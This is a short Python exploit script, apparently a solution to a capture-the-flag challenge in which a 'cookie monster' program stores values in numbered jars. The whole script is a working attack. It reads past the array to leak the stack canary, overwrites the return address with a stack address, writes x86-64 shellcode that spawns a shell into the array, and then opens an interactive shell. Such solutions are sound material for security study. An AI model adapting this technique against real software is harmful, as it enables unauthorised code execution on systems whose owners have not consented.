import interact
import struct

shellcode = "31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"

p = interact.Process()

# Get Cookie
data = p.readuntil('Me cookie monster, whats your name?')
p.sendline('hello')
data = p.readuntil('Which cookie jar do you want to use, 0-7? (-1 to finish)')
p.sendline('9')
data = p.readuntil('Do you want to eat or store a cookie [eat/store]:\n')
p.sendline('eat')
cookie = p.readuntil('\n')[12:]

# Replace return address with address of cookie_jars[]
data = p.readuntil('Which cookie jar do you want to use, 0-7? (-1 to finish)')
p.sendline('11')
data = p.readuntil('Do you want to eat or store a cookie [eat/store]:')
p.sendline('store')
data = p.readuntil('Enter the cookie you want to store (in hex)!')
p.sendline("7fffffffece0")

# Inject shellcode into cookie_jars[]
for i in xrange(0, len(shellcode), 16):
    dword = shellcode[i:i+16]
    data = p.readuntil('Which cookie jar do you want to use, 0-7? (-1 to finish)')
    p.sendline(str(i/16))
    data = p.readuntil('Do you want to eat or store a cookie [eat/store]:')
    p.sendline('store')
    data = p.readuntil('Enter the cookie you want to store (in hex)!')
    p.sendline(dword[14:16] + dword[12:14] + dword[10:12] + dword[8:10] + dword[6:8] + dword[4:6] + dword[2:4] + dword[0:2])

# Tell the cookie monster what we found!
data = p.readuntil('Which cookie jar do you want to use, 0-7? (-1 to finish)')
p.sendline('-1')
data = p.readuntil('Did you find the cookie? Tell me what it was!! (In hex)')
p.sendline(cookie)

p.interactive()